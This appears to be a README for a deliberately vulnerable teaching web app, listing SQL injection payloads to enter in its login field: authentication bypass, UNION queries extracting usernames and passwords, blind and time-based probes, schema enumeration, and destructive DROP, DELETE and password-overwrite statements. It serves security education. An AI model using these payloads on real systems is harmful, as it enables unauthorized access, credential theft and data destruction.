# SQL Injection Examples for Testing

This application is designed to demonstrate SQL injection vulnerabilities for educational purposes.

## Common SQL Injection Payloads to Test:

### 1. Authentication Bypass
```
' OR '1'='1
' OR 1=1--
admin' OR '1'='1
```

### 2. Comment Injection
```
admin'--
admin' --
user'/*
```

### 3. UNION-based Injection
```
' UNION SELECT username, password FROM users--
' UNION SELECT 1,2,3--
```

### 4. Boolean-based Blind Injection
```
' AND '1'='1
' AND '1'='2
admin' AND '1'='1'--
```

### 5. Time-based Blind Injection
```
'; WAITFOR DELAY '00:00:05'--
' OR SLEEP(5)--
```

### 6. Destructive Commands (Will show error)
```
'; DROP TABLE users;--
'; DELETE FROM users;--
'; UPDATE users SET password='hacked';--
```

### 7. Information Schema Queries
```
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns--
```

## How to Use:
1. Enter any of the above payloads in the BroncoName field
2. Click "Log In"
3. Observe how the vulnerable SQL query is constructed
4. See the results of the injection attempt
5. Learn about the specific type of injection detected

## Educational Purpose:
This demonstrates why input validation and parameterized queries are essential for web application security.

**Never use these techniques on systems you don't own or without explicit permission!**